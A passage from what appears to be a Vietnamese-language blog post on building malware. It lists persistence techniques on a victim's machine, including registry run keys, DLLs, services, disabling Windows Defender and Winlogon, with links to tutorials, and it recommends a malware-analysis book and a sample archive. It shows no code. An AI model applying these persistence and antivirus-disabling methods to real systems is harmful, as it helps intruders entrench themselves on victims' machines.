        Bên cạnh việc inject malware và bypass AV, chúng ta cũng cần quan tâm
        tới cách để kéo dài thời lượng của malware trên máy nạn nhân. Có nhiều
        cách như:
      </p>
      <p>
        <li>
          Sử dụng run keys trong registry:
          <a
            href="https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html"
            >Here</a
          >
        </li>
        <li>DLL</li>
        <li>Windows Services</li>
        <li>
          Disable Windows Defender:
          <a
            href="https://cocomelonc.github.io/tutorial/2022/06/05/malware-av-evasion-7.html"
            >Here</a
          >
        </li>
        <li>Winlogon</li>
      </p>
    </div>

    <div class="paratitle">
      <h2>Further Research</h2>
    </div>
    <div class="paragraph">
      <p>
        Nếu bạn đọc chưa có kiến thức nền hoặc muốn tìm hiểu thêm về malware,
        mình recommend cuốn sách Practical Malware Analysis (bản 201x). Dù sách
        đã cũ nhưng nội dung vẫn còn toàn diện và dễ hiểu.<br />
        Mình cũng có note lại một vài điểm quan trọng từ cuốn sách này trong bài
        viết tới.<br /><br />

        <img
          src="malware_source/book_1.png"
          style="width: 25%"
          class="img-fluid mx-auto d-block responsive_phone"
        />
        <br /><br />
      </p>
      <p>
        Sau khi đã có kiến thức cơ bản về malware, bạn đọc có thể tìm hiểu các
        cách thức xây dựng malware dựa trên những mẫu malware được sử dụng thật
        trong quá khứ thông qua những nguồn như:
        <a href="https://vx-underground.org/">Vx Underground</a>.
        <img
          src="malware_source/vxug.png"
          style="width: 25%"
          class="img-fluid mx-auto d-block responsive_phone"
        />
      </p>
    </div>
  </body>
</html>
